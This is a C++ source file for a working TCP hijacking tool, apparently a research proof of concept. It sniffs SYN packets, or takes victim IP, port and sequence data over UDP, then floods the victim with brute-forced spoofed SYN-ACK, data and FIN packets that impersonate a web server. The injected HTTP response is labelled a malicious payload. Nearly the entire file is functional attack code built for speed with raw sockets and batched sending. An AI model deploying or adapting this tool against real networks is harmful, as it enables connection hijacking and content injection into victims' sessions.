// Simple TCP hijacker translation of attacker.py -> C++ (Linux)
// Requires: libpcap (for sniffing) and root privileges to send raw packets
// Compile: g++ attacker.cpp -o attacker -lpcap

#include <pcap.h>
#include <arpa/inet.h>
#include <sys/uio.h> // for sendmmsg
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>
#include <cstdlib>
#include <algorithm>
#include <cctype>
#include <iostream>
#include <chrono>
#include <thread>
#include <random>
#include <sys/prctl.h>

using namespace std;
//////////////constants/////////////////////
const int BRUTE_FORCE_SIZE = 1600; // 6000
const string INTERFACE = "eth0";   // wired
const string TARGET_IP = "192.0.2.123";
const uint16_t TARGET_PORT = 80;
const int SLEEP_MICROSEC = 300;

auto lasttime = chrono::high_resolution_clock::now();

static int raw_sock = -1;

uint16_t checksum(uint16_t *buf, int nwords)
{
    uint32_t sum = 0;
    for (; nwords > 0; nwords--)
        sum += *buf++;
    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)(~sum);
}

struct pseudo_header
{
    uint32_t src_addr;
    uint32_t dst_addr;
    uint8_t zero;
    uint8_t protocol;
    uint16_t tcp_length;
};

uint16_t tcp_checksum(const iphdr *ip, const tcphdr *tcp, const uint8_t *payload, int payload_len)
{
    int tcp_len = ntohs(ip->tot_len) - (ip->ihl * 4);
    int psize = sizeof(pseudo_header) + tcp_len;
    uint8_t buf[psize];
    pseudo_header ph;
    ph.src_addr = ip->saddr;
    ph.dst_addr = ip->daddr;
    ph.zero = 0;
    ph.protocol = IPPROTO_TCP;
    ph.tcp_length = htons(tcp_len);

    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf + sizeof(ph), tcp, (tcp->doff * 4));
    if (payload_len > 0)
        memcpy(buf + sizeof(ph) + (tcp->doff * 4), payload, payload_len);

    uint16_t res = checksum((uint16_t *)buf, psize / 2 + psize % 2);
    // free(buf);
    return res;
}

uint16_t ip_checksum(iphdr *iphdrp)
{
    iphdrp->check = 0;
    return checksum((uint16_t *)iphdrp, iphdrp->ihl * 2);
}

void send_raw_ip_packet(const uint8_t *packet, int packet_len, const char *dst_ip)
{
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = 0;
    inet_pton(AF_INET, dst_ip, &sin.sin_addr);

    if (sendto(raw_sock, packet, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
    {
        perror("sendto");
    }
}

string malicious_payload =
    "HTTP/1.1 200 OK\r\n"
    "Content-Type: text/html\r\n"
    "Content-Length: 23\r\n"
    "Connection: close\r\n"
    "\r\n"
    "hello from attacker\r\n\r\n";

struct state_t
{
    string iface;
    string target_ip; // victim is connecting to target_ip:target_port
    uint16_t target_port = 80;
    // captured victim info
    string victim_ip;
    uint16_t victim_port = 0;
    uint32_t victim_seq = 0;
    uint32_t attacker_seq = 0;
    bool done = false;
};
struct PacketTemplate
{
    uint8_t base[60]; // enough for ip+tcp+options
    size_t header_len;
    char dst_ip[16];
    uint16_t ip_id;
};
PacketTemplate syn_ack_tpl;
// static constexpr size_t FAST_BATCH = 64;
static constexpr size_t FAST_BATCH = 32; // linux
// static constexpr size_t FAST_BATCH = 4; // android
static mmsghdr fast_msgs[FAST_BATCH];
static iovec fast_iov[FAST_BATCH];
static uint8_t fast_bufs[FAST_BATCH][70];
static sockaddr_in fast_sin;
static size_t fast_pending = 0;
static bool fast_initialized = false;
static int cooldown_index = 0;

void init_syn_ack_template(state_t &s)
{
    strcpy(syn_ack_tpl.dst_ip, s.victim_ip.c_str());
    syn_ack_tpl.ip_id = rand() & 0xffff;
    // Build IP + TCP + payload
    int ip_header_len = sizeof(iphdr);
    int tcp_header_len = sizeof(tcphdr);
    int packet_len = ip_header_len + tcp_header_len;
    syn_ack_tpl.header_len = packet_len;
    uint8_t *packet = syn_ack_tpl.base;

    iphdr *ip = (iphdr *)packet;
    tcphdr *tcp = (tcphdr *)(packet + ip_header_len);

    // Fill IP header
    ip->version = 4;
    ip->ihl = ip_header_len / 4;
    ip->tos = 0;
    ip->tot_len = htons(packet_len);
    ip->id = htons(rand() & 0xffff);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    inet_pton(AF_INET, s.target_ip.c_str(), (void *)&ip->saddr);
    inet_pton(AF_INET, s.victim_ip.c_str(), (void *)&ip->daddr);

    // Fill TCP header
    tcp->source = htons(s.target_port);
    tcp->dest = htons(s.victim_port);
    tcp->seq = 0;
    tcp->ack_seq = 0;
    tcp->doff = tcp_header_len / 4;
    tcp->fin = 0;
    tcp->syn = 1;
    tcp->rst = 0;
    tcp->psh = 0;
    tcp->ack = 1;
    tcp->urg = 0;
    tcp->window = htons(65535);
    tcp->check = 0;
    tcp->urg_ptr = 0;
}

static void flush_fast_send()
{
    // sleep a little
    if (cooldown_index++ == 0)
    {
        if (SLEEP_MICROSEC > 0)
        {
            // this_thread::sleep_for(chrono::milliseconds(SLEEP_MILLISEC));
            this_thread::sleep_for(chrono::microseconds(SLEEP_MICROSEC));
        }
        cooldown_index = 0;
    }

    if (fast_pending == 0)
        return;

    size_t sent = 0;
    while (sent < fast_pending)
    {
        // auto start = chrono::high_resolution_clock::now();
        // print fast_msgs[sent]
        // print packet content (raw hex)
        // printf("Flushing %zu packets\n", fast_pending - sent);
        // printf("actual data:\n");
        for (size_t i = sent; i < fast_pending; i++)
        {
            uint8_t *data = (uint8_t *)fast_msgs[i].msg_hdr.msg_iov->iov_base;
            size_t len = fast_msgs[i].msg_hdr.msg_iov->iov_len;
            // for (size_t j = 0; j < len; j++)
            // {
            //     printf("%02x ", data[j]);
            // }
            // printf("\n");
        }
        int ret = sendmmsg(raw_sock, fast_msgs + sent, fast_pending - sent, 0);
        // auto end = chrono::high_resolution_clock::now();
        // auto duration = chrono::duration_cast<chrono::microseconds>(end - start).count();
        // std::cout << "sendmmsg duration: " << duration << " us\n";
        // std::cout << "sendmmsg sent " << ret << " messages\n";
        if (ret < 0)
        {
            // perror("sendmmsg");
            printf("sendmmsg failed: %d\n", errno);
            break;
        }
        sent += static_cast<size_t>(ret);
    }
    fast_pending = 0;
}

void fast_send(uint32_t seq, uint32_t ack)
{
    if (!fast_initialized)
    {
        memset(&fast_sin, 0, sizeof(fast_sin));
        fast_sin.sin_family = AF_INET;
        fast_sin.sin_port = 0;
        inet_pton(AF_INET, syn_ack_tpl.dst_ip, &fast_sin.sin_addr);

        // Zero all mmsghdr structs once at initialization
        memset(fast_msgs, 0, sizeof(fast_msgs));

        fast_initialized = true;
    }

    if (fast_pending >= FAST_BATCH)
    {
        flush_fast_send();
    }

    uint8_t *packet = fast_bufs[fast_pending];
    memcpy(packet, syn_ack_tpl.base, syn_ack_tpl.header_len);
    iphdr *ip = (iphdr *)packet;
    tcphdr *tcp = (tcphdr *)(packet + sizeof(iphdr));

    ip->id = htons(++syn_ack_tpl.ip_id);
    ip->check = 0;
    ip->check = ip_checksum(ip);

    tcp->seq = htonl(seq);
    tcp->ack_seq = htonl(ack);
    tcp->check = 0;
    tcp->check = tcp_checksum(ip, tcp, nullptr, 0);

    fast_iov[fast_pending].iov_base = packet;
    fast_iov[fast_pending].iov_len = syn_ack_tpl.header_len;

    fast_msgs[fast_pending].msg_hdr.msg_name = &fast_sin;
    fast_msgs[fast_pending].msg_hdr.msg_namelen = sizeof(fast_sin);
    fast_msgs[fast_pending].msg_hdr.msg_iov = &fast_iov[fast_pending];
    fast_msgs[fast_pending].msg_hdr.msg_iovlen = 1;

    ++fast_pending;

    if (fast_pending == FAST_BATCH)
    {
        flush_fast_send();
    }
    // send_raw_ip_packet(packet, syn_ack_tpl.header_len, syn_ack_tpl.dst_ip);
}

void craft_and_send(state_t &s, uint8_t flags, uint32_t seq, uint32_t ack, const uint8_t *payload, int payload_len)
{
    // Build IP + TCP + payload
    int ip_header_len = sizeof(iphdr);
    int tcp_header_len = sizeof(tcphdr);
    int packet_len = ip_header_len + tcp_header_len + payload_len;
    uint8_t *packet = (uint8_t *)calloc(1, packet_len);

    iphdr *ip = (iphdr *)packet;
    tcphdr *tcp = (tcphdr *)(packet + ip_header_len);

    // Fill IP header
    ip->version = 4;
    ip->ihl = ip_header_len / 4;
    ip->tos = 0;
    ip->tot_len = htons(packet_len);
    ip->id = htons(rand() & 0xffff);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    inet_pton(AF_INET, s.target_ip.c_str(), (void *)&ip->saddr);
    inet_pton(AF_INET, s.victim_ip.c_str(), (void *)&ip->daddr);
    // inet_pton(AF_INET,"1.2.3.4", (void *)&ip->daddr);
    ip->check = 0;
    ip->check = ip_checksum(ip);

    // Fill TCP header
    tcp->source = htons(s.target_port);
    tcp->dest = htons(s.victim_port);
    tcp->seq = htonl(seq);
    tcp->ack_seq = htonl(ack);
    tcp->doff = tcp_header_len / 4;
    tcp->fin = (flags & TH_FIN) ? 1 : 0;
    tcp->syn = (flags & TH_SYN) ? 1 : 0;
    tcp->rst = (flags & TH_RST) ? 1 : 0;
    tcp->psh = (flags & TH_PUSH) ? 1 : 0;
    tcp->ack = (flags & TH_ACK) ? 1 : 0;
    tcp->urg = 0;
    tcp->window = htons(65535);
    tcp->check = 0;
    tcp->urg_ptr = 0;

    // copy payload if any
    if (payload_len > 0)
    {
        memcpy(packet + ip_header_len + tcp_header_len, payload, payload_len);
    }

    // compute tcp checksum (need to temporarily set ip->tot_len properly for pseudo header calculation)
    // We already set tot_len above and ip pointer points at packet's iphdr
    tcp->check = tcp_checksum(ip, tcp, payload, payload_len);
    // send_raw_ip_packet(packet, packet_len, "1.2.3.4");
    // Send
    send_raw_ip_packet(packet, packet_len, s.victim_ip.c_str());
    free(packet);
}

void craft_syn_ack(uint32_t attacker_seq, uint32_t victim_seq, state_t &s)
{
    // cout << "\n[+] Sending spoofed SYN-ACK packet..."<<"["<< i <<"]" << endl;
    // craft_and_send(s, TH_SYN | TH_ACK, attacker_seq, victim_seq + 1, nullptr, 0);
    fast_send(attacker_seq, victim_seq + 1);
    // cout << "    Sent SYN-ACK: SEQ=" << s.attacker_seq << ", ACK=" << (vs + 1) << endl;
}
void craft_payload_packet(uint32_t attacker_seq, uint32_t victim_seq, state_t &s)
{
    craft_and_send(s, TH_PUSH | TH_ACK, attacker_seq + 1, victim_seq + 1 + 50,
                   (const uint8_t *)malicious_payload.c_str(), malicious_payload.size());
    this_thread::sleep_for(chrono::microseconds(SLEEP_MICROSEC));
}
void craft_fin(uint32_t attacker_seq, uint32_t victim_seq, state_t &s)
{
    int payload_len = malicious_payload.size();
    craft_and_send(s, TH_FIN | TH_ACK, attacker_seq + 1 + payload_len, victim_seq + 1, nullptr, 0);
}

void perform_brute_force(uint32_t attacker_seq, uint32_t victim_seq, state_t &s, void (*func)(uint32_t, uint32_t, state_t &), uint32_t jump)
{
    if (jump == 1) // that means we are sending syn-ack
    {
        init_syn_ack_template(s);
    }
    uint32_t seq = victim_seq - BRUTE_FORCE_SIZE / 2;
    uint32_t end_seq = victim_seq + BRUTE_FORCE_SIZE / 2;
    for (uint32_t i = seq; i <= end_seq; i += jump)
    {
        func(attacker_seq, i, s);
    }
    if (jump == 1) // that means we are sending syn-ack
    {
        flush_fast_send();
    }
}

void perform_hijack(string victim_ip, uint16_t victim_port, uint32_t victim_seq)
{

    // cout<<"printing state:"<<endl;
    // cout<<"iface: "<<s.iface<<endl;
    // cout<<"target_ip: "<<s.target_ip<<endl;
    // cout<<"target_port: "<<s.target_port<<endl;
    // cout<<"victim_ip: "<<s.victim_ip<<endl;
    // cout<<"victim_port: "<<s.victim_port<<endl;
    // cout<<"victim_seq: "<<s.victim_seq<<endl;
    // cout<<"attacker_seq: "<<s.attacker_seq<<endl;
    // lets craft state_t s
    state_t crafted_s;
    crafted_s.iface = INTERFACE;
    crafted_s.target_ip = TARGET_IP;
    crafted_s.target_port = TARGET_PORT;
    crafted_s.victim_ip = victim_ip;
    crafted_s.victim_port = victim_port;
    crafted_s.victim_seq = victim_seq;
    // set attacker seq randomly
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<uint32_t> dis(1000000, 9999999);
    crafted_s.attacker_seq = dis(gen);

    // print brute_force
    cout << "\n[+] Starting TCP hijacking attack..." << endl;
    cout << "    Interface: " << crafted_s.iface << endl;
    cout << "    Victim: " << crafted_s.victim_ip << ":" << crafted_s.victim_port << endl;
    cout << "    Target: " << crafted_s.target_ip << ":" << crafted_s.target_port << endl;
    cout << "    Intercepted SEQ: " << crafted_s.victim_seq << endl;
    cout << "    Attacker SEQ: " << crafted_s.attacker_seq << endl;
    cout << "    Brute force range: " << BRUTE_FORCE_SIZE << std::endl;

    // Step 1: Send several spoofed SYN-ACK from target to victim
    // cout<< "\n[+] Sending spoofed SYN-ACK packet..." << endl;
    // craft_syn_ack(crafted_s.attacker_seq, crafted_s.victim_seq, crafted_s);

    // wait for hole in the NAT
    // this_thread::sleep_for(chrono::milliseconds(5)); //linux
    this_thread::sleep_for(chrono::milliseconds(2)); // android

    // measure time
    auto start = chrono::high_resolution_clock::now();
    perform_brute_force(crafted_s.attacker_seq, crafted_s.victim_seq, crafted_s, craft_syn_ack, 1);
    auto end = chrono::high_resolution_clock::now();
    auto duration = chrono::duration_cast<chrono::milliseconds>(end - start).count();
    cout << "    Brute-force SYN-ACK completed in " << duration << " ms" << endl;

    // Step 2: wait a bit
    // this_thread::sleep_for(chrono::milliseconds(40));
    this_thread::sleep_for(chrono::milliseconds(2));

    // Step 3: send malicious data (PSH-ACK)
    cout << "\n[+] Sending malicious data packet..." << endl;
    perform_brute_force(crafted_s.attacker_seq, crafted_s.victim_seq, crafted_s, craft_payload_packet, 50);
    // craft_payload_packet(s.attacker_seq,s.victim_seq, s);
    cout << "    Sent malicious data: '" << malicious_payload.substr(malicious_payload.find("\r\n\r\n") + 4) << "'" << endl;

    this_thread::sleep_for(chrono::milliseconds(2));
    perform_brute_force(crafted_s.attacker_seq, crafted_s.victim_seq, crafted_s, craft_fin, 50);

    // Send FIN to close connection
    // cout<< "\n[+] Sending FIN packet to close connection" << endl;
    // craft_fin(crafted_s.attacker_seq, crafted_s.victim_seq, crafted_s);
    // cout<< "    Sent FIN packet to close connection" << endl;
}

void packet_handler(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
{
    state_t *s = (state_t *)user;
    if (s->done)
        return;

    const u_char *packet = bytes;
    int linkhdr = 0;
    // Most common LINKTYPE is DLT_EN10MB (Ethernet) -> 14 bytes
    // We'll attempt to assume Ethernet and skip 14 if present
    // Safer: assume Ethernet for this PoC
    linkhdr = 14;
    if (h->caplen < (size_t)(linkhdr + sizeof(iphdr)))
        return;

    const iphdr *ip = (const iphdr *)(packet + linkhdr);
    if (ip->protocol != IPPROTO_TCP)
        return;

    size_t ip_hdr_len = ip->ihl * 4;
    const tcphdr *tcp = (const tcphdr *)((const u_char *)ip + ip_hdr_len);

    uint8_t tcp_flags = 0;
    tcp_flags |= (tcp->fin ? TH_FIN : 0);
    tcp_flags |= (tcp->syn ? TH_SYN : 0);
    tcp_flags |= (tcp->rst ? TH_RST : 0);
    tcp_flags |= (tcp->psh ? TH_PUSH : 0);
    tcp_flags |= (tcp->ack ? TH_ACK : 0);

    // Look for SYN packets (SYN set, ACK not set)
    if ((tcp_flags & TH_SYN) && !(tcp_flags & TH_ACK))
    {
        char src_buf[INET_ADDRSTRLEN];
        char dst_buf[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &ip->saddr, src_buf, sizeof(src_buf));
        inet_ntop(AF_INET, &ip->daddr, dst_buf, sizeof(dst_buf));

        // cout << "[+] Intercepted SYN packet!" << endl;
        // cout << "    Source: " << src_buf << ":" << ntohs(tcp->source) << endl;
        // cout << "    Destination: " << dst_buf << ":" << ntohs(tcp->dest) << endl;
        // cout << "    SEQ: " << ntohl(tcp->seq) << endl;

        if (s->target_ip.empty())
        {
            // set target from dst
            s->target_ip = string(dst_buf);
            cout << "[+] Auto-detected target IP: " << s->target_ip << endl;
        }

        // store victim info
        s->victim_ip = string(src_buf);
        s->victim_port = ntohs(tcp->source);
        s->victim_seq = ntohl(tcp->seq);

        perform_hijack(s->victim_ip, s->victim_port, s->victim_seq);
        s->done = true;
    }
}

int init_raw_socket()
{
    // open raw socket
    raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock < 0)
    {
        perror("socket");
        return 1;
    }
    int one = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
    {
        perror("setsockopt IP_HDRINCL");
        close(raw_sock);
        return 1;
    }
    return 0;
}
int sniffer(int argc, char **argv)
{
    state_t s;
    if (argc < 2)
    {
        cerr << "Usage: " << argv[0] << " <interface> [target_ip] [target_port]" << endl;
        cerr << "Example: sudo ./attacker eth0" << endl;
        return 1;
    }
    s.iface = argv[1];
    if (argc >= 3)
        s.target_ip = argv[2];
    if (argc >= 4)
        s.target_port = atoi(argv[3]);

    if (init_raw_socket() != 0)
    {
        cout << "[-] init_raw_socket failed" << endl;
        return 1;
    }

    // open pcap
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(s.iface.c_str(), BUFSIZ, 1, 1, errbuf);
    if (!handle)
    {
        cerr << "pcap_open_live failed: " << errbuf << endl;
        return 1;
    }

    // compile filter
    string filter_exp = "tcp and dst port " + to_string(s.target_port);
    struct bpf_program fp;
    if (pcap_compile(handle, &fp, filter_exp.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1)
    {
        cerr << "pcap_compile failed" << endl;
        pcap_close(handle);
        return 1;
    }
    if (pcap_setfilter(handle, &fp) == -1)
    {
        cerr << "pcap_setfilter failed" << endl;
        pcap_close(handle);
        return 1;
    }

    cout << "[+] Starting TCP hijacker..." << endl;
    if (!s.target_ip.empty())
        cout << "    Target: " << s.target_ip << ":" << s.target_port << endl;
    else
        cout << "    Target: <auto-detect> port " << s.target_port << endl;
    cout << "    Waiting for SYN packets..." << endl;

    // start sniffing
    pcap_loop(handle, -1, packet_handler, (u_char *)&s);

    pcap_close(handle);
    close(raw_sock);
    return 0;
}

int listener()
{
    // Listen for UDP packets that contain victim info in text format: "IP:PORT:SEQ"
    // Example payload: 192.0.2.5:54321:12345678

    if (init_raw_socket() != 0)
    {
        cout << "[-] init_raw_socket failed" << endl;
        return 1;
    }

    const int LISTEN_PORT = 9999;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("listener: socket");
        return 1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(LISTEN_PORT);

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        perror("listener: bind");
        close(sock);
        return 1;
    }

    cout << "[listener] waiting for victim info on UDP port " << LISTEN_PORT << "\n";

    while (true)
    {
        char buf[256];
        struct sockaddr_in src;
        socklen_t srclen = sizeof(src);
        ssize_t len = recvfrom(sock, buf, sizeof(buf) - 1, 0, (struct sockaddr *)&src, &srclen);
        // print src
        cout << "SRC: " << inet_ntoa(src.sin_addr) << ":" << ntohs(src.sin_port) << endl;
        if (len < 0)
        {
            perror("listener: recvfrom");
            break;
        }
        buf[len] = '\0';
        string msg(buf);
        // trim whitespace
        msg.erase(remove_if(msg.begin(), msg.end(), ::isspace), msg.end());

        // Expect format IP:PORT:SEQ
        size_t p1 = msg.find(':');
        size_t p2 = (p1 == string::npos) ? string::npos : msg.find(':', p1 + 1);
        if (p1 == string::npos || p2 == string::npos)
        {
            cerr << "[listener] invalid message format: '" << msg << "'\n";
            continue;
        }

        string victim_ip = msg.substr(0, p1);
        string port_s = msg.substr(p1 + 1, p2 - p1 - 1);
        string seq_s = msg.substr(p2 + 1);

        uint16_t victim_port = 0;
        uint32_t victim_seq = 0;
        try
        {
            victim_port = (uint16_t)stoul(port_s);
            victim_seq = (uint32_t)stoul(seq_s);
        }
        catch (...)
        {
            cerr << "[listener] parse error for message: '" << msg << "'\n";
            continue;
        }

        cout << "[listener] received victim=" << victim_ip << ":" << victim_port << " seq=" << victim_seq << "\n";

        // Call hijack routine (blocking). In a real setup you may want to spawn a thread.
        cout << "[listener] launching hijack attempt...\n";
        cout << "    victim_ip IP: " << victim_ip << ", Target Port: " << victim_port << "\n";
        cout << "    Intercepted SEQ: " << victim_seq << "\n";
        auto time = chrono::high_resolution_clock::now();
        auto duration = chrono::duration_cast<chrono::milliseconds>(time - lasttime).count();
        if (duration > 0) // at least X seconds between attacks
        {
            perform_hijack(victim_ip, victim_port, victim_seq);
            lasttime = chrono::high_resolution_clock::now();
        }
    }

    close(sock);
    return 0;
}

int main(int argc, char **argv)
{
    prctl(PR_SET_TIMERSLACK, 1);
    cout << string(60, '=') << endl;
    cout << "TCP Hijacking Attacker (C++ / libpcap)" << endl;
    cout << string(60, '=') << endl;
    // sniffer(argc, argv);
    listener();
    cout << "\n[+] Attack completed!" << endl;
    return 0;
}
